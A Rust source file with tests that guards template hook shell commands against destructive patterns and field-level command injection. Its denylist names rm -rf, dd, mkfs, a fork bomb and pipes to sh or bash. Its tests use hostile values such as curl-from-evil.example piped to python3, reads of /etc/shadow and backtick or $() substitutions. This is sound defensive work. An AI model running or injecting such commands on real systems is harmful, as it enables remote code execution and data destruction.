//! Dangerous-shell-command blocklist for frontmatter `sh_before`/`sh_after`
//! hooks.
//!
//! Executing an arbitrary shell command from a template's frontmatter is
//! inherently a security-sensitive capability. This module is the obligation
//! battery that must pass before [`crate::write`] is allowed to run one: a
//! bounded, denylist-based check, not a sandbox — commands are still run
//! with the invoking process's full privileges. The categories checked
//! mirror the prior art found in the `kgen`/`unjucks` SHACL shape
//! (`hasShellCommand` dangerous-command constraint, cited in
//! `docs/v26.7.4/GGEN_TOML_SCHEMA_MAPPING.md`), adapted to a Rust
//! string-pattern check since no SHACL/SPARQL engine runs in this crate.

use crate::error::{AppError, Result};

/// Substrings that mark a shell command as refused outright. Matching is
/// case-insensitive and intentionally broad (false positives fail closed;
/// false negatives would not).
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    "sudo rm",
    "mkfs",
    "dd if=",
    "dd of=",
    ":(){ :|:& };:",
    ":(){:|:&};:",
    "chmod -r 777 /",
    "chmod 777 /",
    "> /dev/sd",
    "> /dev/nvme",
    "| sh",
    "|sh",
    "| bash",
    "|bash",
];

/// Refuse `cmd` if it matches a known-dangerous pattern.
///
/// # Errors
/// Returns `[FM-SHELL-001]` when `cmd` matches an entry in
/// [`DANGEROUS_PATTERNS`].
pub fn check_shell_command_safe(cmd: &str) -> Result<()> {
    let lower = cmd.to_ascii_lowercase();
    for pattern in DANGEROUS_PATTERNS {
        if lower.contains(pattern) {
            return Err(AppError::fm_shell(
                1,
                format!(
                    "sh_before/sh_after command rejected: matches denylisted pattern {pattern:?}. \
                     Remediation: do not run destructive commands from frontmatter hooks."
                ),
            ));
        }
    }
    Ok(())
}

/// Shell metacharacters that must never appear in an individual Tera
/// context value bound into `sh_before`/`sh_after`. Checked independently
/// of [`DANGEROUS_PATTERNS`]: these are control characters that let a
/// single interpolated field escape its argument position and inject
/// arbitrary shell syntax, regardless of whether the resulting assembled
/// string happens to also contain one of the 16 denylisted substrings.
const DANGEROUS_METACHARACTERS: &[char] = &[';', '|', '&', '`', '$', '>', '<', '\n', '\r'];

/// Refuse `value` if it contains a shell metacharacter or a
/// [`DANGEROUS_PATTERNS`] substring. Intended to run against each
/// individual Tera context value bound into a `sh_before`/`sh_after`
/// template — BEFORE Tera interpolation assembles the final command
/// string — so that a single malicious row/ontology field cannot smuggle
/// shell syntax past the post-assembly denylist in
/// [`check_shell_command_safe`].
///
/// # Errors
/// Returns `[FM-SHELL-004]` when `value` contains one of the checked
/// metacharacters, or `[FM-SHELL-001]` (via [`check_shell_command_safe`])
/// when it matches an existing denylisted substring.
pub fn check_interpolated_value_safe(field_name: &str, value: &str) -> Result<()> {
    if let Some(bad) = value.chars().find(|c| DANGEROUS_METACHARACTERS.contains(c)) {
        return Err(AppError::fm_shell(
            4,
            format!(
                "sh_before/sh_after context field `{field_name}` rejected: value {value:?} \
                 contains a shell metacharacter ({bad:?}) or denylisted pattern. Remediation: \
                 do not use shell control characters (; | & ` $ > < newline) in ontology/row \
                 fields consumed by sh_before/sh_after."
            ),
        ));
    }
    check_shell_command_safe(value).map_err(|_| {
        AppError::fm_shell(
            4,
            format!(
                "sh_before/sh_after context field `{field_name}` rejected: value {value:?} \
                 contains a shell metacharacter or denylisted pattern. Remediation: do not use \
                 shell control characters (; | & ` $ > < newline) in ontology/row fields \
                 consumed by sh_before/sh_after."
            ),
        )
    })
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn safe_command_passes() {
        check_shell_command_safe("echo hello").expect("safe command must pass");
    }

    #[test]
    fn rm_rf_is_rejected() {
        let err = check_shell_command_safe("rm -rf /").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }

    #[test]
    fn sudo_rm_is_rejected() {
        let err = check_shell_command_safe("sudo rm important.txt").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }

    #[test]
    fn case_insensitive_match() {
        let err = check_shell_command_safe("RM -RF /tmp").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }

    #[test]
    fn curl_pipe_sh_is_rejected() {
        let err =
            check_shell_command_safe("curl https://evil.example | sh").expect_err("must reject");
        assert!(err.to_string().contains("FM-SHELL-001"), "{err}");
    }

    #[test]
    fn interpolated_mix_task_passes() {
        check_interpolated_value_safe("mixTask", "ash.gen.resource")
            .expect("real ash-igniter field value must pass");
    }

    #[test]
    fn interpolated_module_and_domain_pass() {
        check_interpolated_value_safe("moduleName", "User").expect("plain identifier must pass");
        check_interpolated_value_safe("domainModule", "Accounts")
            .expect("plain identifier must pass");
    }

    #[test]
    fn interpolated_mix_args_flag_passes() {
        check_interpolated_value_safe("mixArgs", "--ignore-if-exists")
            .expect("plain CLI flag must pass");
    }

    #[test]
    fn interpolated_empty_value_passes() {
        check_interpolated_value_safe("mixArgs", "").expect("empty/default value must pass");
    }

    #[test]
    fn interpolated_row_alphanumeric_passes() {
        check_interpolated_value_safe("row", "some-plain-value-123")
            .expect("alphanumeric with hyphens must pass");
    }

    #[test]
    fn interpolated_path_passes() {
        check_interpolated_value_safe("path", "modules/integrations/github/project_management")
            .expect("plain path with no metacharacters must pass");
    }

    #[test]
    fn interpolated_semicolon_pipe_injection_is_rejected() {
        let err = check_interpolated_value_safe(
            "mixTask",
            "ash.gen.resource; curl evil.sh | python3",
        )
        .expect_err("must reject semicolon+pipe injection");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    #[test]
    fn interpolated_backtick_substitution_is_rejected() {
        let err = check_interpolated_value_safe("moduleName", "User`whoami`")
            .expect_err("must reject backtick command substitution");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    #[test]
    fn interpolated_dollar_paren_substitution_is_rejected() {
        let err = check_interpolated_value_safe("moduleName", "User$(whoami)")
            .expect_err("must reject $(...) command substitution");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    #[test]
    fn interpolated_ampersand_chaining_is_rejected() {
        let err = check_interpolated_value_safe("mixArgs", "--flag && rm -rf /")
            .expect_err("must reject && chaining");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    #[test]
    fn interpolated_redirect_gt_is_rejected() {
        let err = check_interpolated_value_safe("mixArgs", "--flag > /etc/passwd")
            .expect_err("must reject > redirect");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    #[test]
    fn interpolated_redirect_lt_is_rejected() {
        let err = check_interpolated_value_safe("mixArgs", "--flag < /etc/shadow")
            .expect_err("must reject < redirect");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    #[test]
    fn interpolated_embedded_newline_is_rejected() {
        let err = check_interpolated_value_safe("moduleName", "User\ncurl evil.sh")
            .expect_err("must reject embedded newline");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    /// Regression check against REAL field values from
    /// `ggen-marketplace/ggen-packs-src/ash-igniter-gen-pipeline-pack/ontology.ttl`
    /// (agp:moduleName/agp:domainModule/agp:mixTask/agp:mixArgs doc comments)
    /// and the real Tera context fields consumed by
    /// `templates/ash_igniter_codegen.tmpl` (`moduleName`, `domainModule`,
    /// `mixTask`, `mixArgs`) -- proves the new per-field check does not
    /// falsely reject legitimate Ash/Igniter values.
    #[test]
    fn real_ash_igniter_pack_field_values_pass() {
        // agp:moduleName real example ("CapabilityLivenessReceipt")
        check_interpolated_value_safe("moduleName", "CapabilityLivenessReceipt")
            .expect("real agp:moduleName example must pass");
        // agp:domainModule real example ("Xaas.Operations")
        check_interpolated_value_safe("domainModule", "Xaas.Operations")
            .expect("real agp:domainModule example must pass");
        // agp:mixTask real examples
        check_interpolated_value_safe("mixTask", "ash.gen.resource")
            .expect("real agp:mixTask example (ash.gen.resource) must pass");
        check_interpolated_value_safe("mixTask", "ash_postgres.generate_migrations")
            .expect("real agp:mixTask example (ash_postgres.generate_migrations) must pass");
        check_interpolated_value_safe("mixTask", "ash.extend")
            .expect("real mix task ash.extend must pass");
        // agp:mixArgs real example ("--ignore-if-exists --default-actions read")
        check_interpolated_value_safe("mixArgs", "--ignore-if-exists --default-actions read")
            .expect("real agp:mixArgs example must pass");
    }

    #[test]
    fn interpolated_literal_denylisted_pattern_is_rejected() {
        let err = check_interpolated_value_safe("moduleName", "rm -rf /")
            .expect_err("must reject literal denylisted substring at field level");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }

    #[test]
    fn most_adversarial_interpolated_value_is_rejected() {
        // A field value engineered to defeat exactly the disclosed gap
        // (denylist inspects only the fully-assembled post-interpolation
        // string): no substring of `DANGEROUS_PATTERNS` appears literally
        // in this value (no "| sh", "|bash", "rm -rf", etc.), but it
        // smuggles a semicolon-chained curl-pipe-to-python exfiltration,
        // a backtick command substitution, a $() substitution, and an
        // embedded newline that would otherwise let it start a second,
        // unbounded shell statement once interpolated into
        // `mix {{ mixTask }} {{ moduleName }} {{ mixArgs }}`.
        let payload =
            "MyApp; curl -s http://evil.example/x.sh | python3 -\n`whoami` $(id) && echo pwned";
        // Sanity: confirm this value does NOT trip the naive post-assembly
        // denylist on its own, i.e. it really does represent the disclosed
        // gap class, not a redundant case of FM-SHELL-001.
        assert!(
            check_shell_command_safe(payload).is_ok(),
            "test payload must NOT match any of the 16 DANGEROUS_PATTERNS substrings, \
             to prove this is the field-level gap and not a case FM-SHELL-001 already caught"
        );
        let err = check_interpolated_value_safe("moduleName", payload)
            .expect_err("the most adversarial interpolated value must be rejected");
        assert!(err.to_string().contains("FM-SHELL-004"), "{err}");
    }
}
